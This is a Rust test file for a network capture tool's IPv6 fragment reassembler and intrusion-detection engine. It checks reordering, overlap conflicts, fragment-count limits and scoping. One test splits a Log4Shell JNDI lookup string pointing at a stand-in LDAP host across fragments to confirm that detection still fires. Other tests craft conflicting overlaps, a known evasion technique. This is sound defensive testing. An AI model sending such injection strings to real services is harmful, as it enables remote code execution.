use packrat_tui::analysis::ipv6_fragments::{Ipv6FragmentOutcome, Ipv6FragmentReassembler};
use packrat_tui::net::packet::{CaptureMetadata, Packet};
use packrat_tui::net::security::SecurityEngine;

fn fragment_packet(no: u64, identification: u32, offset: u16, more: bool, payload: &[u8]) -> Packet {
    assert_eq!(offset % 8, 0);
    let mut bytes = vec![0_u8; 14 + 40 + 8];
    bytes[..6].copy_from_slice(&[0x33, 0x33, 0, 0, 0, 1]);
    bytes[6..12].copy_from_slice(&[0, 1, 2, 3, 4, 5]);
    bytes[12..14].copy_from_slice(&0x86dd_u16.to_be_bytes());
    bytes[14] = 0x60;
    bytes[18..20].copy_from_slice(&((8 + payload.len()) as u16).to_be_bytes());
    bytes[20] = 44;
    bytes[21] = 64;
    bytes[22..38].copy_from_slice(&[0x20, 1, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
    bytes[38..54].copy_from_slice(&[0x20, 1, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2]);
    bytes[54] = 6;
    let offset_flags = offset | u16::from(more);
    bytes[56..58].copy_from_slice(&offset_flags.to_be_bytes());
    bytes[58..62].copy_from_slice(&identification.to_be_bytes());
    bytes.extend_from_slice(payload);
    Packet { capture: None,
        no,
        timestamp: no as f64,
        src: "2001:db8::1".into(),
        dst: "2001:db8::2".into(),
        protocol: "IPv6-Frag".into(),
        length: bytes.len() as u16,
        info: String::new(),
        src_port: None,
        dst_port: None,
        vlan_id: None,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes,
    }
}

#[test]
fn reassembles_ipv6_fragments_arriving_out_of_order() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    let mut last = fragment_packet(1, 7, 16, false, b"qrstuvwx");
    last.bytes[54] = 17; // Only offset zero supplies the reassembled Next Header.
    let first = fragment_packet(2, 7, 0, true, b"abcdefghijklmnop");
    assert!(matches!(reassembler.ingest(&last), Ipv6FragmentOutcome::Pending { .. }));
    match reassembler.ingest(&first) {
        Ipv6FragmentOutcome::Complete { datagram } => {
            assert_eq!(datagram.key.next_header, 6);
            assert_eq!(datagram.payload, b"abcdefghijklmnopqrstuvwx");
            assert_eq!(datagram.fragment_count, 2);
        }
        outcome => panic!("unexpected outcome: {outcome:?}"),
    }
}

#[test]
fn distinguishes_identical_retransmission_from_conflicting_overlap() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    let first = fragment_packet(1, 8, 0, true, b"abcdefghijklmnop");
    assert!(matches!(reassembler.ingest(&first), Ipv6FragmentOutcome::Pending { fragment_count: 1 }));
    assert!(matches!(reassembler.ingest(&first), Ipv6FragmentOutcome::Pending { fragment_count: 1 }));
    let conflict = fragment_packet(2, 8, 8, true, b"XXXXXXXX");
    assert!(matches!(reassembler.ingest(&conflict), Ipv6FragmentOutcome::Overlap {
        previous_frame: 1, conflicting_bytes: true, ..
    }));
    let last = fragment_packet(3, 8, 16, false, b"qrstuvwx");
    assert!(matches!(reassembler.ingest(&last), Ipv6FragmentOutcome::Ignored));
}

#[test]
fn security_reports_conflicting_ipv6_fragments() {
    let mut security = SecurityEngine::default();
    security.update(&fragment_packet(1, 11, 0, true, b"abcdefghijklmnop"));
    let findings = security.inspect(&fragment_packet(2, 11, 8, true, b"XXXXXXXX"));
    let finding = findings.ids.iter().find(|finding| finding.alert.signature == "Conflicting IPv6 fragments").unwrap();
    assert_eq!(finding.related_packets, [1]);
    assert!(finding.alert.detail.contains("endpoint outcome unknown"));
    security.update(&fragment_packet(3, 11, 16, false, b"qrstuvwx"));
    assert_eq!(security.ipv6_reassembled, 0);
    assert!(security
        .ids_alerts
        .iter()
        .any(|alert| alert.signature == "Conflicting IPv6 fragments"));
}

#[test]
fn reassembled_ipv6_payload_runs_through_security_signatures() {
    let payload = b"\x13\x88\x01\xbbabcdefghijkl${jndi:ldap://example.test/x}";
    let split = 24;
    let mut security = SecurityEngine::default();
    security.update(&fragment_packet(1, 9, 0, true, &payload[..split]));
    security.update(&fragment_packet(2, 9, split as u16, false, &payload[split..]));

    assert_eq!(security.ipv6_reassembled, 1);
    assert!(security.ids_alerts.iter().any(|alert| alert.signature == "Log4Shell (CVE-2021-44228)"));
}

#[test]
fn rejects_excessive_ipv6_fragment_count() {
    let mut security = SecurityEngine::default();
    for index in 0..=128_u64 {
        let payload = [(index & 0xff) as u8; 8];
        let mut fragment = fragment_packet(index + 1, 10, index as u16 * 8, true, &payload);
        fragment.timestamp = index as f64 / 100.0;
        security.update(&fragment);
    }
    assert!(security
        .ids_alerts
        .iter()
        .any(|alert| alert.signature == "IPv6 fragment reassembly rejected"));
}

#[test]
fn ipv6_fragment_reassembly_keeps_interface_and_vlan_scopes_separate() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    let packet = |no, offset, more, interface_id, vlan, payload| {
        let mut packet = fragment_packet(no, 12, offset, more, payload);
        packet.capture = Some(CaptureMetadata {
            timestamp: None, wire_length: packet.bytes.len() as u32,
            captured_length: packet.bytes.len() as u32, link_type: 1,
            section_id: 0, interface_id, interface_name: None, comments: Vec::new(),
        });
        packet.outer_vlan_id = Some(vlan);
        packet.vlan_id = Some(20);
        packet
    };
    let first = packet(1, 0, true, 0, 100, b"abcdefgh");
    let other_interface = packet(2, 8, false, 1, 100, b"ijklmnop");
    let other_vlan = packet(3, 8, false, 0, 200, b"ijklmnop");
    for fragment in [first, other_interface, other_vlan] {
        assert!(matches!(reassembler.ingest(&fragment), Ipv6FragmentOutcome::Pending { fragment_count: 1 }));
    }
    let last = packet(4, 8, false, 0, 100, b"ijklmnop");
    assert!(matches!(reassembler.ingest(&last), Ipv6FragmentOutcome::Complete { .. }));
}

#[test]
fn ipv6_fragment_equal_partial_overlap_is_not_an_exact_duplicate() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    reassembler.ingest(&fragment_packet(1, 13, 0, true, b"abcdefghijklmnop"));
    let overlapping = fragment_packet(2, 13, 8, false, b"ijklmnop");
    assert!(matches!(reassembler.ingest(&overlapping), Ipv6FragmentOutcome::Overlap {
        previous_frame: 1, conflicting_bytes: false, ..
    }));
}

#[test]
fn ipv6_fragment_truncation_does_not_supply_a_final_length() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    reassembler.ingest(&fragment_packet(1, 14, 0, true, b"abcdefgh"));
    let mut truncated = fragment_packet(2, 14, 8, false, b"ijklmnop");
    truncated.bytes.pop();
    assert!(matches!(reassembler.ingest(&truncated), Ipv6FragmentOutcome::Ignored));
    let full = fragment_packet(3, 14, 8, false, b"ijklmnop");
    assert!(matches!(reassembler.ingest(&full), Ipv6FragmentOutcome::Complete { .. }));
}

#[test]
fn ipv6_atomic_fragment_does_not_modify_pending_datagram() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    reassembler.ingest(&fragment_packet(1, 15, 0, true, b"abcdefgh"));
    let atomic = fragment_packet(2, 15, 0, false, b"standalone");
    let Ipv6FragmentOutcome::Complete { datagram } = reassembler.ingest(&atomic) else {
        panic!("atomic fragment should be handled independently");
    };
    assert_eq!(datagram.payload, b"standalone");
    let last = fragment_packet(3, 15, 8, false, b"ijklmnop");
    let Ipv6FragmentOutcome::Complete { datagram } = reassembler.ingest(&last) else {
        panic!("original datagram should still be pending");
    };
    assert_eq!(datagram.payload, b"abcdefghijklmnop");
}

#[test]
fn ipv6_fragment_cannot_extend_past_the_final_length() {
    let mut reassembler = Ipv6FragmentReassembler::default();
    reassembler.ingest(&fragment_packet(1, 16, 8, false, b"ijklmnop"));
    let outside = fragment_packet(2, 16, 16, true, b"qrstuvwx");
    assert!(matches!(reassembler.ingest(&outside), Ipv6FragmentOutcome::Rejected {
        reason: "Inconsistent IPv6 final fragment length"
    }));
    let first = fragment_packet(3, 16, 0, true, b"abcdefgh");
    assert!(matches!(reassembler.ingest(&first), Ipv6FragmentOutcome::Ignored));
}
